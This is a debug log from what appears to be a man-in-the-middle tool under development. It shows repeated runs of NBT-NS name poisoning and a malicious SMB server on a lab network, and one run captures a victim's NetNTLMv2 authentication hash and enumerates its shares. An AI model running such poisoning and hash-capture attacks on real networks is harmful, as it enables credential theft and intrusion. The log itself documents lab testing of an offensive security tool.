2021-11-30 17:39:52.330 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:228 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
2021-12-04 16:35:06.892 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:512 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 16:35:37.892 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 16:39:15.695 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:237 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-12-04 16:39:15.696 | DEBUG    | project.igris:check_settable_variables_value:205 - Checking the correct value of the necessary settable variables 
2021-12-04 16:39:15.700 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 16:39:15.705 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:544 - Starting nbt-ns poisoning...
2021-12-04 16:39:15.705 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 16:39:15.709 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 16:39:15.711 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 16:39:15.713 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 16:39:22.975 | WARNING  | scapy.packet:__str__:559 - Calling str(pkt) on Python 3 makes no sense!
2021-12-04 16:39:22.977 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - Packet crafted: 
2021-12-04 16:39:22.978 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:516 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 16:39:22.978 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:519 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 16:39:23.014 | WARNING  | scapy.packet:__str__:559 - Calling str(pkt) on Python 3 makes no sense!
2021-12-04 16:39:23.015 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - Packet crafted: 
2021-12-04 16:39:23.015 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:516 - Ether / UDP netbios_ns > netbios_ns / NBNSQueryRequest / Raw
2021-12-04 16:39:23.015 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:519 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 16:39:23.926 | WARNING  | scapy.packet:__str__:559 - more Calling str(pkt) on Python 3 makes no sense!
2021-12-04 16:39:23.928 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - Packet crafted: 
2021-12-04 16:39:23.929 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:516 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 16:39:24.678 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - Packet crafted: 
2021-12-04 16:39:24.678 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:516 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 16:39:24.724 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - Packet crafted: 
2021-12-04 16:39:24.725 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:516 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 16:39:25.445 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - Packet crafted: 
2021-12-04 16:39:25.445 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:516 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 16:39:25.491 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - Packet crafted: 
2021-12-04 16:39:25.491 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:516 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 16:56:13.552 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:237 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-12-04 16:56:13.552 | DEBUG    | project.igris:check_settable_variables_value:205 - Checking the correct value of the necessary settable variables 
2021-12-04 16:56:13.555 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 16:56:13.562 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:544 - Starting nbt-ns poisoning...
2021-12-04 16:56:13.563 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 16:56:13.568 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 16:56:13.569 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 16:56:13.570 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 16:56:40.532 | WARNING  | scapy.packet:__str__:559 - Calling str(pkt) on Python 3 makes no sense!
2021-12-04 16:56:40.534 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - Packet crafted: 
2021-12-04 16:56:40.535 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:516 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 16:56:40.536 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:519 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 16:56:40.575 | WARNING  | scapy.packet:__str__:559 - Calling str(pkt) on Python 3 makes no sense!
2021-12-04 16:56:40.577 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - Packet crafted: 
2021-12-04 16:56:40.577 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:516 - Ether / UDP netbios_ns > netbios_ns / NBNSQueryRequest / Raw
2021-12-04 16:56:40.577 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:519 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 16:56:40.825 | WARNING  | scapy.packet:__str__:559 - more Calling str(pkt) on Python 3 makes no sense!
2021-12-04 16:56:40.827 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - Packet crafted: 
2021-12-04 16:56:40.829 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:516 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 16:56:41.562 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - Packet crafted: 
2021-12-04 16:56:41.563 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:516 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 16:56:42.311 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - Packet crafted: 
2021-12-04 16:56:42.312 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:516 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 16:57:01.213 | WARNING  | scapy.packet:__str__:559 - Calling str(pkt) on Python 3 makes no sense!
2021-12-04 16:57:01.215 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - Packet crafted: 
2021-12-04 16:57:01.216 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:516 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 16:57:01.216 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:519 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 16:57:01.251 | WARNING  | scapy.packet:__str__:559 - Calling str(pkt) on Python 3 makes no sense!
2021-12-04 16:57:01.252 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - Packet crafted: 
2021-12-04 16:57:01.253 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:516 - Ether / UDP netbios_ns > netbios_ns / NBNSQueryRequest / Raw
2021-12-04 16:57:01.253 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:519 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 16:57:01.306 | WARNING  | scapy.packet:__str__:559 - more Calling str(pkt) on Python 3 makes no sense!
2021-12-04 16:57:01.310 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - Packet crafted: 
2021-12-04 16:57:01.312 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:516 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 16:57:03.940 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 16:58:31.605 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:237 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-12-04 16:58:31.606 | DEBUG    | project.igris:check_settable_variables_value:205 - Checking the correct value of the necessary settable variables 
2021-12-04 16:58:31.608 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 16:58:31.615 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:544 - Starting nbt-ns poisoning...
2021-12-04 16:58:31.616 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 16:58:31.620 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 16:58:31.621 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 16:58:31.627 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 16:58:58.693 | WARNING  | scapy.packet:__str__:559 - Calling str(pkt) on Python 3 makes no sense!
2021-12-04 16:58:58.694 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - Packet crafted: 
2021-12-04 16:58:58.695 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:516 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 16:58:58.696 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:519 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 16:58:58.734 | WARNING  | scapy.packet:__str__:559 - Calling str(pkt) on Python 3 makes no sense!
2021-12-04 16:58:58.736 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - Packet crafted: 
2021-12-04 16:58:58.736 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:516 - Ether / UDP netbios_ns > netbios_ns / NBNSQueryRequest / Raw
2021-12-04 16:58:58.736 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:519 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 16:59:12.536 | WARNING  | scapy.packet:__str__:559 - Calling str(pkt) on Python 3 makes no sense!
2021-12-04 16:59:12.536 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - Packet crafted: 
2021-12-04 16:59:12.537 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:516 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 16:59:12.537 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:519 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 16:59:12.571 | WARNING  | scapy.packet:__str__:559 - Calling str(pkt) on Python 3 makes no sense!
2021-12-04 16:59:12.572 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - Packet crafted: 
2021-12-04 16:59:12.572 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:516 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 16:59:12.575 | WARNING  | scapy.packet:__str__:559 - more Calling str(pkt) on Python 3 makes no sense!
2021-12-04 16:59:12.576 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - Packet crafted: 
2021-12-04 16:59:12.576 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:516 - Ether / UDP netbios_ns > netbios_ns / NBNSQueryRequest / Raw
2021-12-04 16:59:12.576 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:519 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 16:59:12.669 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - Packet crafted: 
2021-12-04 16:59:12.671 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:516 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 16:59:13.280 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - Packet crafted: 
2021-12-04 16:59:13.281 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:516 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 16:59:13.420 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - Packet crafted: 
2021-12-04 16:59:13.420 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:516 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 16:59:14.040 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - Packet crafted: 
2021-12-04 16:59:14.040 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:516 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 16:59:14.181 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - Packet crafted: 
2021-12-04 16:59:14.182 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:516 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 16:59:15.132 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 17:04:01.195 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:237 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-12-04 17:04:01.196 | DEBUG    | project.igris:check_settable_variables_value:205 - Checking the correct value of the necessary settable variables 
2021-12-04 17:04:01.199 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 17:04:01.204 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:543 - Starting nbt-ns poisoning...
2021-12-04 17:04:01.205 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 17:04:01.209 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 17:04:01.209 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 17:04:01.212 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 17:04:14.608 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:514 - Packet crafted: 
2021-12-04 17:04:14.608 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:04:14.609 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:518 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 17:04:14.637 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.129,49887)
2021-12-04 17:04:14.649 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:514 - Packet crafted: 
2021-12-04 17:04:14.649 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:515 - Ether / UDP netbios_ns > netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:04:14.650 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:518 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 17:04:14.773 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (RSGBENGICORP\apuia,PC-ALEX)
2021-12-04 17:04:14.773 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-ALEX\apuia authenticated successfully
2021-12-04 17:04:14.784 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - apuia::RSGBENGICORP:aaaaaaaaaaaaaaaa:c0451719409ee7cf7e841b239c2e0da8:0101000000000000007bdbf630e9d701f7733316beb2b8980000000001001000630073005000770061006a004b00640003001000630073005000770061006a004b0064000200100044007800680074004d004a00700078000400100044007800680074004d004a007000780007000800007bdbf630e9d70106000400020000000800300030000000000000000100000000200000b00025b57ee18ea21b2dfaa257329d0d4bf57affe71c4ad8cbfc05d7fa0ddf480a001000000000000000000000000000000000000900260063006900660073002f0063006f007200720065006500650065006d0061006d006f006f006f000000000000000000
2021-12-04 17:04:14.887 | INFO     | impacket.smbserver:NetrWkstaGetInfo:4534 - NetrWkstaGetInfo Level: 100
2021-12-04 17:04:14.925 | INFO     | impacket.smbserver:NetrServerGetInfo:4624 - NetrServerGetInfo Level: 101
2021-12-04 17:04:15.318 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
2021-12-04 17:04:25.462 | INFO     | impacket.smbserver:smbComTreeDisconnect:1921 - Disconnecting Share(1:IPC$)
2021-12-04 17:04:25.468 | INFO     | impacket.smbserver:finish:3798 - Closing down connection (192.168.253.129,49887)
2021-12-04 17:04:25.469 | INFO     | impacket.smbserver:removeConnection:3946 - Remaining connections []
2021-12-04 17:04:31.568 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 17:14:22.782 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:237 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-12-04 17:14:22.784 | DEBUG    | project.igris:check_settable_variables_value:205 - Checking the correct value of the necessary settable variables 
2021-12-04 17:14:22.789 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 17:14:22.803 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:547 - Starting nbt-ns poisoning...
2021-12-04 17:14:22.804 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 17:14:22.831 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 17:14:22.834 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 17:14:22.835 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 17:14:27.452 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 17:14:48.528 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:237 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-12-04 17:14:48.528 | DEBUG    | project.igris:check_settable_variables_value:205 - Checking the correct value of the necessary settable variables 
2021-12-04 17:14:48.531 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 17:14:48.536 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:548 - Starting nbt-ns poisoning...
2021-12-04 17:14:48.537 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 17:14:48.540 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 17:14:48.540 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 17:14:48.541 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 17:14:49.664 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 17:26:13.442 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:237 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-12-04 17:26:13.442 | DEBUG    | project.igris:check_settable_variables_value:205 - Checking the correct value of the necessary settable variables 
2021-12-04 17:26:13.447 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 17:26:13.455 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:548 - Starting nbt-ns poisoning...
2021-12-04 17:26:13.455 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 17:26:13.459 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 17:26:13.460 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 17:26:13.461 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 17:26:21.064 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:519 - Packet crafted: 
2021-12-04 17:26:21.065 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:520 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:26:21.065 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 17:26:21.098 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:519 - Packet crafted: 
2021-12-04 17:26:21.099 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:520 - Ether / UDP netbios_ns > netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:26:21.099 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 17:26:21.851 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:519 - Packet crafted: 
2021-12-04 17:26:21.851 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:520 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:26:22.604 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:519 - Packet crafted: 
2021-12-04 17:26:22.604 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:520 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:26:23.228 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:519 - Packet crafted: 
2021-12-04 17:26:23.228 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:520 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:26:23.369 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:519 - Packet crafted: 
2021-12-04 17:26:23.369 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:520 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:26:23.979 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:519 - Packet crafted: 
2021-12-04 17:26:23.980 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:520 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:26:23.981 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 17:26:24.011 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.129,49912)
2021-12-04 17:26:24.029 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:519 - Packet crafted: 
2021-12-04 17:26:24.030 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:520 - Ether / UDP netbios_ns > netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:26:24.030 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - [36m(NBT_NS) Sending packet to None[0m
